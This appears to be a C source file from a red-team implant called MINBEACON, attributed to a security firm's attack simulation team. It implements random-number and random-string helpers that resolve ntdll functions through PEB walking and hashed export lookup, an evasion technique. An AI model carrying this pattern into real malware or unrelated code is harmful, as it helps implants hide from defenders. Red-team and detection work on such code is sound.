/*!
 *
 * MINBEACON
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

NTSTATUS
NTAPI
RtlRandomEx(
	_In_ PUINT32 Seed
);

typedef struct
{
	D_API( RtlRandomEx );
} API ;

/* API Hashes */
#define H_API_RTLRANDOMEX	0x7f1224f5 /* RtlRandomEx */

/* LIB Hashes */
#define H_LIB_NTDLL		0x1edab0ed /*  ntdll.dll */	

/*!
 *
 * Purpose:
 *
 * Creates a random UINT32 integer 
 *
!*/
D_SEC( B ) UINT32 RandomInt32( VOID )
{
	API	Api;
	UINT32	Val = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Build Stack API Table */
	Api.RtlRandomEx = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLRANDOMEX );

	/* Get Random Value */
	Val = NtGetTickCount();
	Val = Api.RtlRandomEx( &Val );
	Val = Api.RtlRandomEx( &Val );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Return Integer */
	return Val;
};

/*!
 *
 * Purpose:
 *
 * Fills a buffer with a random string of the
 * specified size.
 *
!*/
D_SEC( B ) VOID RandomString( _In_ PVOID Buffer, _In_ UINT32 Length )
{
	PCHAR	Chr = C_PTR( G_PTR( "ABCDEFGHIJKLMNOPQRSTUVWXYZ" ) );
	PCHAR	Buf = C_PTR( Buffer );
	UINT32	Val = 0;

	/* Go through each individual character */
	for ( INT Idx = 0 ; Idx < Length ; ++Idx ) {
		/* Get a random value */
		Val = RandomInt32( ) % 26;

		/* Set character */
		Buf[ Idx ] = Chr[ Val ];
	};
};
